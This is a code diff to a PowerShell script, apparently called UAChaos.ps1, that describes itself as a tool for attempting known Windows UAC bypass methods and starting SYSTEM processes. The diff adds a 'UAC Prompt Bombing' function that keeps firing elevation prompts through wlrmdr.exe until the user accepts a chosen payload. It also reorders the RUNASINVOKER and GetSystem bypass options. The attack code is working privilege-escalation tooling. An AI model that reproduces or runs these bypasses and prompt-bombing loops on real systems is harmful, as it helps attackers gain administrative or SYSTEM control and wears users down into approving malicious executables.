@@ -6,6 +6,7 @@
     This script attempts various known UAC bypass Methods on Windows.
     It supports executing either a single Method or all sequentially until one succeeds.
     With the GetSystem flag you also can start a SYSTEM process.
+    UAC Bombing with proxing LOLBAS commands also available.
 
     Extra Info:
     For foreground the cmd window in SYSTEM Mode you can use the MSDT ServiceUI.exe: 
@@ -17,6 +18,7 @@
 .EXAMPLE
     .\UAChaos.ps1 -Method computerdefaults -Command "calc.exe" 
     .\UAChaos.ps1 -Method fodhelper -Command "cmd.exe /c "start cmd.exe" -GetSystem
+    .\UAChaos.ps1 -UACBombing -Command "W:\IA\Setup.exe"
 
 .NOTES
     Autor: suuhm
@@ -34,6 +36,9 @@
 
 .PARAMETER RunAsInvoker
     Optional Command if you wish to bypass UAC for common lowlevel tools.
+
+.PARAMETER UACBombing
+    Optional File (C:\Temp\Payload.exe) NO Command yet if you wish to start UAC Prompt Bombing.
 #>
 
 
@@ -49,7 +54,10 @@ param(
     [switch]$GetSystem,
 
     [Parameter(Mandatory=$false)]
-    [switch]$RunAsInvoker
+    [switch]$RunAsInvoker,
+
+    [Parameter(Mandatory=$false)]
+    [switch]$UACBombing
 )
 
 function Show-Banner {
@@ -89,6 +97,24 @@ function Invoke-RunAsInvoker {
     # RAI Bypass Fallback
     $env:__COMPAT_LAYER = "RUNASINVOKER"
     Start-Process $Cmd
+}
+
+function Invoke-UACBombing {
+    param([string]$Cmd)
+    #
+    # UAC-Prompt-Bombing PoC
+    #
+    Write-Error "" -ErrorAction SilentlyContinue
+    # Dbg returned Errorlevel
+    # echo $?
+    while (-not $?) {
+        try{
+            Start-Process -Verb RunAs wlrmdr.exe -ArgumentList "-s 3600 -f 0 -t _ -m _ -a 11 -u $Cmd" 
+            # Start-Process -Verb RunAs wt.exe -ArgumentList "cmd /c `"$Cmd`""
+        } catch { 
+            Write-Error "" -ErrorAction SilentlyContinue 
+        }
+    }
 }
 
 function Cleanup-Registry {
@@ -231,17 +257,22 @@ function Invoke-AllMethods {
 #
 Show-Banner
 
-if ($RunAsInvoker) {
-    $Command = Invoke-RunAsInvoker -Cmd $Command
-    Write-Host "`n [!] Running RUNASINVOKER Bypass with command ($Command)" -ForegroundColor DarkCyan
-}
-
 if ($GetSystem) {
     $Command = Invoke-GetSystem -Cmd $Command
     Write-Host "`n [!] Running command ($Command) as NT\SYSTEM." -ForegroundColor DarkCyan
 }
 
-if (-not $Method -and -not $RunAsInvoker) {
+if ($RunAsInvoker) {
+    Invoke-RunAsInvoker -Cmd $Command
+    Write-Host "`n [!] Running RUNASINVOKER Bypass with command ($Command)" -ForegroundColor DarkCyan
+}
+
+if ($UACBombing) {
+    Invoke-UACBombing -Cmd $Command
+    Write-Host "`n [!] Running UAC Prompt Bombing Attack with command ($Command)" -ForegroundColor DarkCyan
+}
+
+if (-not $Method -and -not $RunAsInvoker -and -not $UACBombing) {
     Write-Host "`n [!] Please specify a Method. Valid values are: fodhelper, eventvwr, computerdefaults, sdclt, wsreset, mmc, eudcedit, netplwiz, all." -ForegroundColor Yellow
     exit
 }
